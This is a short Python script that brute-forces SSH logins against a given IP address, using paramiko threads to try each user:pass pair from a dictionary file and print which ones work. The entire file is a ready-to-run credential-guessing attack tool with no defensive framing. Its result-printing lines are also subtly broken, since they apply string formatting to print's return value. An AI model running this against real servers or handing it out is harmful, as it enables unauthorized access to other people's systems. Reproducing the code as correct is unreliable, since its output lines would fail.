#!/usr/bin/python3
import paramiko, sys, time, threading

if len(sys.argv) < 3:
    print("Usage: %s IP path_to_dictionary" %(str(sys.argv[0])))
    print("Dictionary shall be in user:pass format")
    sys.exit(1)

ip = sys.argv[1]; filename = sys.argv[2]
f = open(filename, "r")

def connect(ip, UserName, Password):
    ssh = paramiko.SSHClient()
    #AutoAddPolicy() automatically add new hostname and key to local HostKeys object.
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy)
    try:
        ssh.connect(ip, username=UserName, password=Password)
    except paramiko.AuthenticationException:
        print ("[+] %s %s fail!") %(UserName, Password)
    else:
        print ("[+] %s %s Correct") %(UserName, Password)
    ssh.close()
    return
print ("[+] Bruteforcing against %s with dictionary %s" % (ip, filename))
for line in f.readlines():
    username, password = line.strip().split(":")
    t = threading.Thread(target=connect, args=(ip, username, password))
    t.start()
    time.sleep(0.3)

f.close()
sys.exit(0)

